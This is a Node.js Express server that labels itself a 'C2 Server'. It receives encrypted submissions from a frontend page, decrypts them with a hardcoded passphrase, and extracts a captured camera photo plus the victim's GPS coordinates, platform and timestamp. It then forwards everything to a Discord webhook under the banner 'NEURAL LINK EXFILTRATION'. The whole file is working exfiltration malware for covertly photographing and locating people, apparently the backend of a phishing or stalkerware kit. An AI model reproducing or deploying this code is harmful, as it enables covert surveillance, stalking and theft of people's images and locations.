const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const SECRET_PASSPHRASE = "neural-link-omega-99"; // Must match frontend

app.use(express.json({ limit: '50mb' }));

// Helper: Decrypt AES-GCM (Phase 2)
function decryptPayload(encryptedPackage) {
    try {
        const { iv, content } = encryptedPackage;
        
        // Convert base64 back to buffers
        const ivBuffer = Buffer.from(iv, 'base64');
        const encryptedBuffer = Buffer.from(content, 'base64');

        // Derive key using PBKDF2 (Matches frontend settings)
        const salt = Buffer.from("neural-static-salt");
        const key = crypto.pbkdf2Sync(SECRET_PASSPHRASE, salt, 100000, 32, 'sha256');

        // AES-GCM uses the last 16 bytes as the Auth Tag
        const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);
        const ciphertext = encryptedBuffer.slice(0, encryptedBuffer.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, ivBuffer);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext, 'binary', 'utf8');
        decrypted += decipher.final('utf8');

        return JSON.parse(decrypted);
    } catch (err) {
        console.error("[-] Decryption failed: Invalid key or corrupted data");
        return null;
    }
}

app.post('/save-photo', async (req, res) => {
    // 1. Decrypt the incoming "noise"
    const decryptedData = decryptPayload(req.body);

    if (!decryptedData) {
        return res.sendStatus(403); // Forbidden if decryption fails
    }

    const { image, metadata } = decryptedData;
    console.log(`[!] Intelligence Received from: ${metadata.platform}`);

    // 2. Process Image Buffer
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    // 3. Forward to Discord
    if (DISCORD_WEBHOOK) {
        try {
            const form = new FormData();
            form.append('file', buffer, { filename: 'capture.jpg' });
            
            const embed = {
                title: "⚡ NEURAL LINK EXFILTRATION",
                color: 0x6366f1,
                fields: [
                    { name: "📍 Location", value: `[${metadata.location.lat}, ${metadata.location.lon}](https://www.google.com/maps?q=${metadata.location.lat},${metadata.location.lon})`, inline: true },
                    { name: "💻 Platform", value: metadata.platform, inline: true },
                    { name: "🕒 Timestamp", value: metadata.timestamp, inline: false }
                ],
                image: { url: "attachment://capture.jpg" },
                footer: { text: "Secure Tunnel Status: AES-256-GCM Active" }
            };

            form.append('payload_json', JSON.stringify({ embeds: [embed] }));

            await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        } catch (err) {
            console.error("[-] Discord Exfiltration Failed");
        }
    }

    res.sendStatus(200);
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, () => console.log(`🚀 C2 Server Online | Encryption Port: ${PORT}`));
